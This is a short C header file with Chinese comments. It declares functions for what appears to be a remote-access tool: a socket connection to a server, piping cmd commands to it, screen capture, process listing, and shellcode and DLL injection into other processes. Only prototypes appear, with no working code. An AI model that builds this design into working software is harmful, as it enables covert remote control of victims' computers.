#pragma once
#pragma comment(lib,"ws2_32.lib")

//功能：初始化sock连接服务器
//返回值：客户端SOCKET句柄 -1失败
SOCKET InitSock();

//功能：初始化sock连接服务器
//参数：传出型参数给本程序读管道，写管道，创建进程id赋值
//返回值：是否初始成功 0失败
BOOL InitPipe(_Out_ HANDLE* myin, _Out_ HANDLE* myout, _Out_ DWORD* prcessid);


//功能：向服务器发cmd数据
//参数：管道，写管道，socket句柄，命令指针
VOID cmd(HANDLE myIn, HANDLE myOut, SOCKET s, char* lpStr);

VOID GetScreen(SOCKET);

DWORD _stdcall proceThread(LPVOID p);

DWORD _stdcall connectFun(LPVOID p);

BOOL Getprocesslist(SOCKET);
BOOL inJectshellcode(DWORD dwProcessId);

BOOL inJectDLL(DWORD dwProcessId, LPCTSTR lpDllPath);